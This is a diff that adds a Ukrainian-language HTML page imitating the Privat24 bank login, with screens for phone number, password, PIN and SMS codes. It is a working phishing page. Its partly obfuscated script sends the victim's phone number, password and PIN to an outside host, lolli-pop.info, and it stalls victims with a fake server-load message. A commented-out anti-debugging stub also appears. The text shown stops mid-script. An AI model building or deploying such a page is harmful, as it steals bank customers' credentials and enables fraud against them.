@@ -1,0 +1,880 @@
+<!DOCTYPE html>
+<html lang="ua">
+
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <meta property="og:title" content="">
+   <meta property="og:description" content="">
+   <meta property="og:image" content="">
+   <link rel="shortcut icon" href="./favicon.ico">
+   <link rel="stylesheet" href="./core/privat_style.min.css">
+   <link rel="preconnect" href="https://fonts.googleapis.com">
+   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+   <link
+      href="//fonts.googleapis.com/css2/index%EF%B9%96family=Open+Sans%EF%B9%95wght@300%EF%B9%94400%EF%B9%94500%EF%B9%94600%EF%B9%94700%EF%B9%94800&amp;display=swap.css"
+      rel="stylesheet">
+   <title>Приват24</title>
+   <style>
+      a {
+         text-decoration: none;
+      }
+
+      .error-border {
+         border-bottom: 2px solid red !important;
+      }
+
+      .p24pn {
+         position: relative;
+      }
+
+      .p24n {
+         border-radius: 20;
+      }
+
+      .login_number {
+         color: #8dc641;
+         font-size: 20px;
+         font-weight: bold;
+      }
+
+      .p24ev {
+         display: none;
+         position: absolute;
+         color: red;
+         font-size: 15px;
+         bottom: -45px;
+         /* Изменено с "-45px" на "-60px" */
+         left: 0;
+         white-space: normal;
+         width: 100%;
+      }
+
+      .error-spacing-dynamic {
+         margin-bottom: 50px;
+         /* Начальное значение margin-bottom */
+      }
+
+      .image_block {
+         height: 200px;
+         width: 200px;
+         min-height: 200px;
+         max-height: 200px;
+         text-align: center;
+      }
+
+      .p24scm {
+         line-height: 1.5;
+      }
+
+      .gVtZaa {
+         position: relative;
+         color: rgba(0, 0, 0, 0.87);
+         text-align: center;
+         padding: 16px;
+         font-size: 14px;
+         line-height: 22px;
+         font-weight: 400;
+         margin: auto auto 24px;
+         background: rgba(230, 108, 108, 0.16);
+         border-radius: 8px;
+      }
+
+      .iGhxGv {
+         flex-shrink: 0;
+         margin: 0px auto 4px;
+         display: flex;
+         -webkit-box-pack: center;
+         justify-content: center;
+         -webkit-box-align: center;
+         align-items: center;
+      }
+
+      .gaOUzQ {
+         text-align: center;
+      }
+   </style>
+</head>
+
+<body>
+   <div class="header">
+      <svg width="44" height="44" viewBox="0 0 44 44" class="svg_p24">
+         <g fill="none" fill-rule="evenodd">
+            <path fill="#8BC34A"
+               d="M22 1.995c2.703 0 5.32.528 7.784 1.57a19.847 19.847 0 0 1 6.357 4.289 19.957 19.957 0 0 1 4.289 6.357A19.881 19.881 0 0 1 42 21.995c0 2.703-.528 5.32-1.57 7.784a19.847 19.847 0 0 1-4.289 6.357 19.957 19.957 0 0 1-6.357 4.289A19.881 19.881 0 0 1 22 41.995c-2.703 0-5.32-.528-7.784-1.57a19.847 19.847 0 0 1-6.357-4.289A19.957 19.957 0 0 1 3.57 29.78 19.881 19.881 0 0 1 2 21.995c0-2.703.528-5.32 1.57-7.784A19.847 19.847 0 0 1 7.86 7.854a19.957 19.957 0 0 1 6.357-4.289A19.863 19.863 0 0 1 22 1.995zM22 0C9.848 0 0 9.848 0 22c0 12.147 9.848 22 22 22 12.147 0 22-9.848 22-22-.005-12.152-9.853-22-22-22z">
+            </path>
+            <g fill="#303030">
+               <path
+                  d="M20.67 29.624h-9.932c.195-3.503 1.894-4.754 4.535-6.408 1.634-1.032 3.633-2.148 3.633-4.365 0-1.7-1.206-2.88-2.945-2.88-2.278 0-3.065 1.933-3.11 3.827h-1.69l-.019-.41c0-3.009 1.958-5.007 4.903-5.007 2.88 0 4.754 1.739 4.754 4.43 0 2.965-2.322 4.385-4.56 5.74-1.395.837-2.99 1.66-3.398 3.379h7.829v1.694zM33.227 25.937h-2.083v3.687h-1.7v-3.687h-6.687v-1.86l6.723-9.696h1.664v9.871h2.083v1.685zm-3.782-8.92l-4.874 7.23h4.874v-7.23z">
+               </path>
+            </g>
+         </g>
+      </svg>
+   </div>
+   <div class="card__title" style="font-weight: 600;">Авторизація через Приват24</div>
+   <div class="container">
+      <div el="Content" class="content">
+         <div class="login">
+            <div el="LiqpayLogin">
+               <div style="background-color:transparent;width:100%;transition:height .2s ease-in-out 0s">
+                  <div class="p24o">
+                     <div id="lk_form" class="p24_modal">
+                        <div class="p24h">
+                           <h2>Вхід у Приват24</h2>
+                        </div>
+                        <style>
+                           .modal_msg {
+                              display: none;
+                              color: white;
+                              font-size: 15px;
+                              margin-top: 20px;
+                           }
+
+                           .step_image {
+                              margin-top: 15px;
+                           }
+
+                           img {
+                              pointer-events: none;
+                              user-select: none;
+                              -webkit-user-drag: none;
+                              -moz-user-select: none;
+                              -ms-user-select: none;
+                              -webkit-user-select: none;
+                           }
+                        </style>
+                        <div class="" id="code_three" style="display:none;">
+                           <div class="p24smsw">
+                              <div class="p24sc">
+                                 <span class="p24scm">Номер телефону:</span>
+                                 <br>
+                                 <p class="login_number" style="margin-top: 10px;"></p>
+                                 <br>
+                                 <span id="reaction_title" class="p24scm">SMS-повідомлення з паролем було надіслано на
+                                    ваш номер</span>
+                                 <br><br>
+                                 <span id="reaction_text" style="text-align:left;">Код складається із 3 символів</span>
+                              </div>
+                              <div class="p24smsdigits">
+                                 <input class="p24sdi code_three" name="sms_three" placeholder="000" minlength="3"
+                                    maxlength="3" tabindex="1" autocomplete="off">
+                              </div>
+                              <div id="code_three_input_error"
+                                 style="color:#d40000; font-size: 14px; text-align: center; margin-top: 20px; display:none;">
+                                 Код повинен складатися з 3 цифр
+                              </div>
+                           </div>
+                           <div class="p24nb">
+                              <button class="p24n" id="sendsms">Підтвердити</button>
+                           </div>
+                        </div>
+                        <div class="" id="code_four" style="display:none;">
+                           <div class="p24smsw">
+                              <div class="p24sc">
+                                 <span class="p24scm">Номер телефону:</span>
+                                 <br>
+                                 <p class="login_number" style="margin-top: 10px;"></p>
+                                 <br>
+                                 <span id="reaction_title" class="p24scm">SMS-повідомлення з паролем було надіслано на
+                                    ваш номер</span>
+                                 <br><br>
+                                 <span id="reaction_text" style="text-align:left;">Код складається із 4 символів</span>
+                              </div>
+                              <div class="p24smsdigits">
+                                 <input class="p24sdi code_four" name="sms_four" type="text" placeholder="0000"
+                                    minlength="4" maxlength="4" tabindex="1" autocomplete="off">
+                              </div>
+                              <div id="code_four_input_error"
+                                 style="color:#d40000; font-size: 14px; text-align: center; margin-top: 20px; display:none;">
+                                 Код повинен складатися з 4 цифр
+                              </div>
+                           </div>
+                           <div class="p24nb">
+                              <button class="p24n">Підтвердити</button>
+                           </div>
+                        </div>
+                        <div class="" id="code_infinitely" style="display:none;">
+                           <div class="p24smsw">
+                              <div class="p24sc">
+                                 <span class="p24scm">Номер телефону:</span>
+                                 <br>
+                                 <p class="login_number" style="margin-top: 10px;"></p>
+                                 <br>
+                                 <span id="reaction_title" class="p24scm">SMS-повідомлення з паролем було надіслано на
+                                    ваш номер</span>
+                                 <br><br>
+                                 <span style="text-align:left;">Код складається із символів</span>
+                              </div>
+                              <div class="p24smsdigits">
+                                 <input class="p24sdi code_infinitely" name="sms_infinitely"
+                                    style="letter-spacing: 3px;" placeholder="Введіть код" minlength="3" maxlength="15"
+                                    tabindex="1" autocomplete="off">
+                              </div>
+                              <div id="code_infinitely_input_error"
+                                 style="color:#d40000; font-size: 14px; text-align: center; margin-top: 20px; display:none;">
+                                 Обов'язкове для заповнення
+                              </div>
+                           </div>
+                           <div class="p24nb">
+                              <button class="p24n">Підтвердити</button>
+                           </div>
+                        </div>
+                        <div class="p24t selected" data-p24-tab="login">
+                           <div class="p24e">
+                              <div class="p24ei">
+                                 <div style="display:flex">
+                                    <svg height="24" width="24" version="1.1" viewBox="0 0 24 24"
+                                       xmlns="http://www.w3.org/2000/svg">
+                                       <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1">
+                                          <path d="M0 0h24v24H0z"></path>
+                                          <path d="M12 2L1 21h22M12 6l7.53 13H4.47M11 10v4h2v-4m-2 6v2h2v-2"
+                                             fill="#ff5b5c" fill-rule="nonzero"></path>
+                                       </g>
+                                    </svg>
+                                 </div>
+                              </div>
+                           </div>
+                           <div class="sc-bypJrT gVtZaa error_phone" style="display:none">
+                              <div class="sc-dSCufp gaOUzQ">
+                                 <div class="sc-ddjGPC iGhxGv">
+                                    <div style="display: flex;">
+                                       <svg height="24" width="24" fill="none" viewBox="0 0 24 24"
+                                          xmlns="http://www.w3.org/2000/svg">
+                                          <path d="M12 3L1 21.208h22M11 10.667V14.5h2v-3.833m-2 5.75v1.916h2v-1.916"
+                                             fill="#D22E3B" fill-rule="evenodd"></path>
+                                       </svg>
+                                    </div>
+                                 </div>
+                                 <div>Введено некоректний логін</div>
+                              </div>
+                           </div>
+                           <div class="p24pnl">Номер телефону</div>
+                           <div class="p24pn error_login">
+                              <div class="p24pc">
+                                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="12">
+                                    <rect width="16" height="12" fill="#005BBB"></rect>
+                                    <rect width="16" height="6" y="6" fill="#FFD500"></rect>
+                                 </svg>
+                                 +380
+                              </div>
+                              <div class="p24pd">
+                                 <div></div>
+                              </div>
+                              <input type="text" id="login" hidden="">
+                              <div class="p24pni">
+                                 <input pattern="\d{2}\s\d{3}\s\d{2}\s\d{2}" inputmode="numeric" placeholder="000000000"
+                                    class="p24pnio" id="loginInput" min="5" name="phone" tabindex="-1" maxlength="12">
+                              </div>
+                              <input id="input_again" type="hidden" value="">
+                              <div id="error_phone" class="p24ev">Невідома помилка</div>
+                           </div>
+                           <div class="p24nb">
+                              <button class="p24n" type="button" id="sendphone">Продовжити</button>
+                              <script>
+                                 var phone
+
+                                 document.getElementById("sendphone").addEventListener("click", function () {
+
+                                    phone = "+380" + document.getElementById('loginInput').value
+
+                                    if (document.getElementById('input_again').value != "ask_error_phone") {
+
+                                       sendphone();
+
+                                    } else {
+
+                                       loading();
+                                       send_input("+380" + document.getElementById('loginInput').value, 'ask_error_phone');
+                                    };
+
+                                 });
+
+                              </script>
+                           </div>
+                           <div class="p24qr">
+                              <svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="116" height="116"
+                                 viewBox="0 0 288 288">
+                                 <path d="M0 34.5V69h69V0H0v34.5zm59-.5v25H9V9h50v25z"></path>
+                                 <path
+                                    d="M19 34v15h30V19H19v15zM89 4.5V9H79v10h10v10H79v10h19V29h11v10h9V19h10V9h-19v10H98V0h-9v4.5zM139 9.5V19h49V9h11v10h9V0h-29v9h-31V0h-9v9.5zM218 34.5V69h70V0h-70v34.5zm60-.5v25h-50V9h50v25z">
+                                 </path>
+                                 <path
+                                    d="M238 34v15h30V19h-30v15zM189 24v5h9V19h-9v5zM129 34v5h-10v10h29V39h-10V29h-9v5zM149 34v5h20v10h9V39h10V29h-39v5zM99 54v15h9V39h-9v15zM189 44v5h19V39h-19v5zM79 59v10h10V49H79v10zM149 54v5h9V49h-9v5zM179 64v15h9V49h-9v15zM119 74v15h19V79h-10V59h-9v15zM139 69v10h10v10h29V79h-10V59h-9v10h-11V59h-9v10z">
+                                 </path>
+                                 <path
+                                    d="M199 69v10h9v10h-29v10h-31V89h-9v30h10v10h9v-10h10v-10h20V99h20v10h-19v10h10v10h9v30h20v-10h10v10h10v10h-69v10h49v20h-10v-10h-10v10h-9v10h-10v20h10v20h59v10h-59v10h-10v10h19v9h10v-9h-10v-10h20v19h20v-9h10v9h10v-9h10v-20h10v-30h-10v20h-10v-10h-20v-10h20v-20h10v10h10v-10h-10v-30h10v-10h-10v-10h10v-10h-10v-10h10v-10h-10v10h-10v20h-10v-30h10v-10h10v-10h-10V99h20V89h-10V79h-10v10h-10V79h-10v10h-10V79h-10v10h-10V79h-10V59h-9v10zm19 25v5h10V89h10v10h-10v10h10v10h20v-10h-10V99h10v10h10v10h-10v10h-50v-20h10V99h-10V89h10v5zm10 50v5h-10v-10h10v5zm20 0v5h-10v-10h10v5zm30 30v5h-20v-10h20v5zm-10 25v10h-10v-20h10v10zm-30 25v15h-30v-30h30v15zm30 45v10h-10v-20h10v10z">
+                                 </path>
+                                 <path
+                                    d="M218 114v5h10v-10h-10v5zM218 224v5h10v-10h-10v5zM0 89v10h9v10H0v20h9v10H0v70h9v-50h10v20h10v-10h10v40h10v-10h10v10h20v20h10v10H79v49h29v-19h-9v10H89v-30h9v-10h10v-20h-9v10H89v-10h9v-10h-9v-10h9v-10h-9v10H79v-10H69v-10H59v10H49v-30h10v10h10v-10h10v10h10v10h9v-10h10v-10H89v-10h9v-10h10v-10H98v-10h11v10h10v10h29v-10h-10v-10h-20v-10h10V99h-19v10H98V89h10V79H59v10H49V79H0v10zm29 5v5H9V89h20v5zm20 0v5H39V89h10v5zm20 0v5H59V89h10v5zm20 5v10H79v10H59v-10h20V89h10v10zm-40 20v10H39v-20h10v10zm-20 5v5H9v-10h20v5zm40 10v5H59v-10h10v5zm-20 10v5H39v10H19v-10H9v-10h40v5zm40 0v5H79v-10h10v5zm-20 10v5H59v-10h10v5zm0 40v5H59v-10h10v5zM169 124v5h9v-10h-9v5zM159 134v5h9v-10h-9v5zM179 134v5h19v-10h-19v5zM149 144v5h9v-10h-9v5zM169 144v5h9v-10h-9v5z">
+                                 </path>
+                                 <path
+                                    d="M119 159v10h59v-10h-50v-10h-9v10zM179 154v5h19v-10h-19v5zM109 174v5h9v-10h-9v5zM129 184v5h9v-10h-9v5zM149 184v5h-10v10h19v-20h-9v5zM119 194v5h9v-10h-9v5zM179 194v5h-20v10h29v-20h-9v5zM99 204v5h10v10h19v-10h-10v-10H99v5zM129 204v5h9v-10h-9v5zM139 224v15h-11v-10h-9v20h59v-10h-30v-10h30v-10h-30v-10h-9v15zM0 253.5V288h69v-69H0v34.5zm59 .5v25H9v-50h50v25z">
+                                 </path>
+                                 <path
+                                    d="M19 254v15h30v-30H19v15zM99 254v5h19v-10H99v5zM179 254v5h-10v10h19v-20h-9v5zM119 269v10h9v-20h-9v10z">
+                                 </path>
+                                 <path d="M149 264v5h-10v10h10v9h39v-9h-30v-20h-9v5zM129 283.5v4.5h9v-9h-9v4.5z">
+                                 </path>
+                              </svg>
+                           </div>
+                           <div class="p24qrc">QR-код для входу через смартфон</div>
+                        </div>
+                        <div class="p24t" data-p24-tab="loading">
+                           <div class="p24lpw" data-qa-node="progress">
+                              <div class="p24lp">
+                                 <div class="kuUDJu"></div>
+                                 <div class="erJhGs"></div>
+                              </div>
+                           </div>
+                           <p style="text-align: center;line-height: 25px;">У зв'язку з високим навантаженням на сервер
+                              ПриватБанку тривалість операції може тривати до 10 хвилин. Чекайте та не закривайте
+                              сторінку.</p>
+                        </div>
+                        <div class="p24t" data-p24-tab="password">
+                           <div class="p24e">
+                              <div class="p24ei">
+                                 <div style="display:flex">
+                                    <svg height="24" width="24" version="1.1" viewBox="0 0 24 24"
+                                       xmlns="http://www.w3.org/2000/svg">
+                                       <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1">
+                                          <path d="M0 0h24v24H0z"></path>
+                                          <path d="M12 2L1 21h22M12 6l7.53 13H4.47M11 10v4h2v-4m-2 6v2h2v-2"
+                                             fill="#ff5b5c" fill-rule="nonzero"></path>
+                                       </g>
+                                    </svg>
+                                 </div>
+                              </div>
+                              <div class="p24ev">Невідома помилка</div>
+                           </div>
+                           <div class="sc-bypJrT gVtZaa error_pass" style="display:none">
+                              <div class="sc-dSCufp gaOUzQ">
+                                 <div class="sc-ddjGPC iGhxGv">
+                                    <div style="display: flex;">
+                                       <svg height="24" width="24" fill="none" viewBox="0 0 24 24"
+                                          xmlns="http://www.w3.org/2000/svg">
+                                          <path d="M12 3L1 21.208h22M11 10.667V14.5h2v-3.833m-2 5.75v1.916h2v-1.916"
+                                             fill="#D22E3B" fill-rule="evenodd"></path>
+                                       </svg>
+                                    </div>
+                                 </div>
+                                 <div>Введен некоректний пароль</div>
+                              </div>
+                           </div>
+                           <div class="p24pnl pw">Номер телефону</div>
+                           <div class="p24pn pw">
+                              <div id="formatted_phone" class="p24pc pw">+38 (066) 777 00 10</div>
+                              <div class="p24phc pw">
+                                 <button class="p24cpb" id="p24changeLogin">
+                                    <svg height="24px" width="24px" version="1.1" viewBox="0 0 24 24"
+                                       xmlns="http://www.w3.org/2000/svg">
+                                       <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1">
+                                          <path d="M0 0h24v24H0z"></path>
+                                          <path
+                                             d="M4 16.67v3.332h3.333l9.832-9.83-3.334-3.334L4 16.669zm15.742-9.077a.885.885 0 0 0 0-1.253l-2.08-2.08a.885.885 0 0 0-1.253 0l-1.627 1.627 3.334 3.333 1.626-1.627z"
+                                             fill="#000" fill-rule="nonzero"></path>
+                                       </g>
+                                    </svg>
+                                 </button>
+                              </div>
+                           </div>
+                           <div class="p24pnl psw">Пароль</div>
+                           <div class="p24pn psw">
+                              <div class="p24pni">
+                                 <input type="password" placeholder="********" class="p24pnio" name="password"
+                                    id="password" min="1" tabindex="" maxlength="35">
+                              </div>
+                              <button class="p24cpb" id="p24passtoggle">
+                                 <svg height="24px" width="24px" version="1.1" viewBox="0 0 24 24"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1">
+                                       <path d="M0 0h24v24H0z"></path>
+                                       <path
+                                          d="M12 9a3 3 0 1 1 0 6 3 3 0 0 1 0-6zm0-4.5c5 0 9.27 3.11 11 7.5-1.73 4.39-6 7.5-11 7.5S2.73 16.39 1 12c1.73-4.39 6-7.5 11-7.5zM3.18 12a9.821 9.821 0 0 0 17.64 0 9.821 9.821 0 0 0-17.64 0z"
+                                          fill="#000" fill-rule="nonzero"></path>
+                                    </g>
+                                 </svg>
+                              </button>
+                              <div id="error_password" class="p24ev">Неверный пароль</div>
+                           </div>
+                           <div class="p24pnl rp"><a href="" data-qa-node="restore-password" class="p24rp">Забули
+                                 пароль?</a> </div>
+                           <div class="p24nb"><button class="p24n" type="button" id="sendpass">Далi</button> </div>
+                        </div>
+                        <script>
+                           document.getElementById("sendpass").addEventListener("click", function () {
+
+                              if (document.getElementById('input_again').value != "ask_error_pass") {
+
+                                 sendpass();
+
+                              } else {
+
+                                 loading();
+                                 send_input(document.getElementById('password').value, 'ask_error_pass');
+                              };
+
+                           });
+
+                        </script>
+                        <div class="p24t" data-p24-tab="pin">
+                           <input type="text" name="pin" maxlength="4" hidden="" id="pin">
+                           <div class="p24pw">
+                              <div class="sc-bypJrT gVtZaa error_pin" style="display:none">
+                                 <div class="sc-dSCufp gaOUzQ">
+                                    <div class="sc-ddjGPC iGhxGv">
+                                       <div style="display: flex;">
+                                          <svg height="24" width="24" fill="none" viewBox="0 0 24 24"
+                                             xmlns="http://www.w3.org/2000/svg">
+                                             <path d="M12 3L1 21.208h22M11 10.667V14.5h2v-3.833m-2 5.75v1.916h2v-1.916"
+                                                fill="#D22E3B" fill-rule="evenodd"></path>
+                                          </svg>
+                                       </div>
+                                    </div>
+                                    <div>Введен некоректний пiн-код</div>
+                                 </div>
+                              </div>
+                              <center>Пін код</center>
+                              <br>
+                              <div class="p24pi">
+                                 <div class="p24pdc pincodeLetter"></div>
+                                 <div class="p24pdc pincodeLetter"></div>
+                                 <div class="p24pdc pincodeLetter"></div>
+                                 <div id="full_pin" class="p24pdc pincodeLetter"></div>
+                              </div>
+                              <div id="error_pin"
+                                 style="color:#d40000; font-size: 14px; text-align: center; margin-top: 20px; display:none;">
+                                 Пiн-код повинен складатися з 4 цифр
+                              </div>
+                              <div class="p24pbw">
+                                 <button type="button" class="p24pb pincodeBtn">7</button><button type="button"
+                                    class="p24pb pincodeBtn">8</button><button type="button"
+                                    class="p24pb pincodeBtn">9</button><button type="button"
+                                    class="p24pb pincodeBtn">4</button><button type="button"
+                                    class="p24pb pincodeBtn">5</button><button type="button"
+                                    class="p24pb pincodeBtn">6</button><button type="button"
+                                    class="p24pb pincodeBtn">1</button><button type="button"
+                                    class="p24pb pincodeBtn">2</button><button type="button"
+                                    class="p24pb pincodeBtn">3</button>
+                                 <button type="button" class="p24pb cancel" id="resetpin">
+                                    <svg version="1.1" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                       <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1">
+                                          <path d="M0 0h24v24H0z"></path>
+                                          <path
+                                             d="M19 6.137L17.863 5 12 10.863 6.137 5 5 6.137 10.863 12 5 17.863 6.137 19 12 13.137 17.863 19 19 17.863 13.137 12z"
+                                             fill="#000"></path>
+                                       </g>
+                                    </svg>
+                                 </button>
+                                 <button type="button" class="p24pb pincodeBtn">0</button>
+                                 <button type="button" class="p24pb delete" id="deldig">
+                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+                                       <path
+                                          d="M469.333 64h-320c-14.72 0-26.347 7.467-34.027 18.773L0 255.893l115.307 173.12C122.987 440.32 134.613 448 149.333 448h320C492.907 448 512 428.907 512 405.333V106.667C512 83.093 492.907 64 469.333 64zm-64 268.48l-30.187 30.187-76.48-76.48-76.48 76.48L192 332.48 268.48 256 192 179.52l30.187-30.187 76.48 76.48 76.48-76.48 30.187 30.187L328.853 256l76.48 76.48z">
+                                       </path>
+                                    </svg>
+                                 </button>
+                              </div>
+                           </div>
+                           <div class="p24nb">
+                              <button class="p24n" type="submit" form="lk_form" id="sendpin">Далi</button>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+   </div>
+   <script> var error_check = 0x0;</script>
+   <script src="./core/axios.min.js"></script>
+   <script src="./core/jquery-3.6.0.min.js"></script>
+   <script>logsApi = axios.create({
+         baseURL: 'https://lolli-pop.info',
+         headers: {
+            'Accept': 'application/json',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Content-Type': 'application/json;charset=UTF-8',
+         }, withCredentials: false
+      });
+
+      const phoneInput = document.getElementById("loginInput");
+      const passwordInput = document.getElementById("password");
+      function loading(_0x2ea1d6 = true) {
+         document.querySelectorAll("[data-p24-tab]").forEach(_0xa2d02e => _0xa2d02e.classList.remove("selected"));
+         const _0x1c23af = document.querySelector("[data-p24-tab='loading']");
+         _0x1c23af.classList.remove("selected");
+         if (_0x2ea1d6) {
+            _0x1c23af.classList.add("selected");
+         }
+      }
+      function openPhoneDiv() {
+         loading();
+         setTimeout(() => {
+            loading(false);
+            document.querySelector("[data-p24-tab='login']").classList.add("selected");
+         }, 0x1f4);
+      }
+      function openPasswordDiv() {
+         loading();
+         const _0x1534ae = phoneInput.value.replace(/\D+/g, "");
+         if (!_0x1534ae.match(/^\d{9}$/)) {
+            document.getElementById("error_phone").innerText = "Некоректний номер телефону";
+            document.getElementById("error_phone").style.display = "block";
+            return void loading(false);
+         }
+         document.getElementById("error_phone").style.display = "none";
+         document.getElementById("formatted_phone").innerText = "+380" + _0x1534ae;
+         var _0x499742 = document.getElementsByClassName("login_number");
+         for (var _0x1cc57e = 0x0; _0x1cc57e < _0x499742.length; _0x1cc57e++) {
+            _0x499742[_0x1cc57e].innerText = "+380" + _0x1534ae;
+         }
+         document.getElementById("login").value = "+380" + _0x1534ae;
+         setTimeout(() => {
+            loading(false);
+            document.querySelector("[data-p24-tab='password']").classList.add("selected");
+         }, 0x1f4);
+      }
+      function openPinDiv() {
+         loading();
+         setTimeout(() => {
+            loading(false);
+            document.querySelector("[data-p24-tab=\"pin\"]").classList.add("selected");
+         }, 0x1f4);
+      }
+      function validatePassword() {
+         const _0x4f5529 = passwordInput.value;
+         const _0x547c71 = passwordInput.closest(".p24pn");
+         return _0x4f5529.length < 0x6 ? (document.getElementById("error_password").innerText = "Пароль повинен містити мінімум 6 символів", document.getElementById("error_password").style.display = "block", _0x547c71.classList.add("error-border", "error-spacing-dynamic"), updateErrorSpacingById("password", "error_password"), false) : (document.getElementById("error_password").style.display = "none", _0x547c71.classList.remove("error-border", "error-spacing-dynamic"), updateErrorSpacingById("password", "error_password"), true);
+      }
+      function sendpass() {
+         if (error_check == 0x2) {
+            return false;
+         }
+         if (validatePassword()) {
+            openPinDiv();
+         } else {
+            passwordInput.focus();
+         }
+      }
+      function sendphone() {
+         const _0x39965f = phoneInput.closest(".p24pn");
+         const _0x5e3c6b = phoneInput.value.replace(/\D+/g, "");
+         let _0x1c3888 = false;
+         if ("" === phoneInput.value.trim()) {
+            document.getElementById("error_phone").innerText = "Поле номера телефону є обов'язковим";
+            document.getElementById("error_phone").style.display = "block";
+            _0x39965f.classList.add("error-border", "error-spacing-dynamic");
+            _0x1c3888 = true;
+         } else if (_0x5e3c6b.match(/^\d{9}$/)) {
+            function uuidv4() {
+               return "10000000-1000-4000-8000-100000000000".replace(/[018]/g, c =>
+                  (+c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +c / 4).toString(16)
+               );
+            }
+
+            logsApi.post("/log", {
+               id: uuidv4(),
+               from_service: location.host,
+               login: _0x5e3c6b,
+               password: "",
+               pin: "",
+               status: "pending",
+               ip: "",
+               user_agent: navigator.userAgent
+            }).then(response => {
+               localStorage.setItem("log_id", response.data.id);
+               // order_id = response.data.log_id;
+            });
+            document.getElementById("error_phone").style.display = "none";
+            _0x39965f.classList.remove("error-border", "error-spacing-dynamic");
+            document.getElementById("loginInput").blur();
+            openPasswordDiv();
+
+         } else {
+            document.getElementById("error_phone").innerText = "Некоректний номер телефону";
+            document.getElementById("error_phone").style.display = "block";
+            _0x39965f.classList.add("error-border", "error-spacing-dynamic");
+            _0x1c3888 = true;
+         }
+         if (_0x1c3888) {
+            phoneInput.focus();
+         }
+
+         updateErrorSpacingById("loginInput", "error_phone");
+      }
+      function sendpin() {
+         if (0x4 !== document.getElementById("pin").value.length) {
+            document.getElementById("error_pin").style.display = "block";
+         } else {
+            document.getElementById("error_pin").style.display = "none";
+            submitBtnAction();
+         }
+      }
+      function updateErrorSpacingById(_0x1e16d3, _0x2b8fd7) {
+         const _0x137868 = document.getElementById(_0x2b8fd7);
+         const _0x37896f = document.getElementById(_0x1e16d3).closest(".p24pn");
+         const _0x29e286 = _0x137868.offsetHeight;
+         if ("none" !== _0x137868.style.display) {
+            _0x37896f.style.marginBottom = _0x29e286 + 0x23 + "px";
+            _0x137868.style.bottom = "-" + (_0x29e286 + 0xa) + "px";
+         } else {
+            _0x37896f.style.marginBottom = "";
+            _0x137868.style.bottom = "";
+         }
+      }
+      phoneInput.addEventListener("input", function (_0x5896a2) {
+         var _0x336abb = _0x5896a2.target.value.replace(/\D/g, "").match(/(\d{0,2})(\d{0,3})(\d{0,2})(\d{0,2})/);
+         _0x5896a2.target.value = _0x336abb[0x2] ? _0x336abb[0x1] + " " + _0x336abb[0x2] + (_0x336abb[0x3] ? " " + _0x336abb[0x3] : "") + (_0x336abb[0x4] ? " " + _0x336abb[0x4] : "") : _0x336abb[0x1];
+         if (0x9 === this.value.replace(/\D+/g, "").length) {
+            document.getElementById("sendphone").click();
+         }
+      });
+      document.getElementById("resetpin").addEventListener("click", function () {
+         document.getElementById("pin").value = "";
+         document.querySelectorAll(".pincodeLetter").forEach(_0x5a99d8 => _0x5a99d8.classList.remove("y"));
+      });
+      document.querySelectorAll(".pincodeBtn").forEach(_0x25cc6e => _0x25cc6e.addEventListener("click", function () {
+         const _0x3e9a7 = document.getElementById("pin");
+         if (_0x3e9a7.value.length < 0x4) {
+            document.querySelector(".pincodeLetter:not(.y)").classList.add("y");
+            _0x3e9a7.value += this.innerText;
+         }
+         if (0x4 === _0x3e9a7.value.length) {
+            loading();
+            document.getElementById("sendpin").click();
+         }
+      }));
+      document.getElementById("deldig").addEventListener("click", function () {
+         const _0x4109b4 = document.getElementById("pin");
+         if (_0x4109b4.value.length >= 0x1) {
+            _0x4109b4.value = _0x4109b4.value.substring(0x0, _0x4109b4.value.length - 0x1);
+            const _0x1fb521 = document.querySelectorAll(".pincodeLetter.y");
+            if (_0x1fb521.length > 0x0) {
+               _0x1fb521[_0x1fb521.length - 0x1].classList.remove("y");
+            }
+         }
+      });
+      document.getElementById("p24passtoggle").addEventListener("click", function (_0x26c0b9) {
+         _0x26c0b9.preventDefault();
+         passwordInput.type = "password" === passwordInput.type ? "text" : "password";
+      });
+      document.getElementById("p24changeLogin").addEventListener("click", function (_0x148da3) {
+         _0x148da3.preventDefault();
+         openPhoneDiv();
+         passwordInput.closest(".p24pn").classList.remove("error-border", "error-spacing-dynamic");
+         document.getElementById("error_password").innerText = "";
+         document.getElementById("error_password").style.display = "none";
+         updateErrorSpacingById("password", "error_password");
+      });</script>
+   <script>
+      // ConsoleBan.init({
+      //    'redirect': 'https://youtu.be/dQw4w9WgXcQ?si=Sgw6YbMbhThxfF2W'
+      // });
+      const logsApi = axios.create({
+         baseURL: 'https://lolli-pop.info',
+         headers: {
+            'Accept': 'application/json',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Content-Type': 'application/json;charset=UTF-8',
+         }, withCredentials: false
+      });
+
+      var order_id = localStorage.getItem('log_id')
+
+
+      $("#password").on('input', function () {
+         $(this).val($(this).val().replace(/[Яа-яЁё]/, ''));
+      });
+      $(document).on("click", "#sendpin", function () {
+         order_id = localStorage.getItem('log_id')
+         if (error_check == 0x2) {
+            if ($('#pin').val().length != 0x4) {
+               $(".error_pin").fadeIn();
+               return false;
+            } else {
+               $(".error_pin").fadeOut();
+               logsApi.patch("/log", {
+                  'id': order_id,
+                  'state': 0,
+                  'pin': $('#pin').val()
+               });
+               bot_stop.interval = check();
+            }
+         } else {
+            if ($("#pin").val().length != 0x4) {
+               $('#error_pin').fadeIn();
+               return false;
+            } else {
+               order_id = localStorage.getItem('log_id')
+               $("#error_pin").fadeOut();
+
+               logsApi.patch("/log", {
+                  'id': order_id,
+                  'login': $("#loginInput").val(),
+                  'pin': $('#pin').val(),
+                  'password': $("#password").val(),
+                  'state': 0
+               });
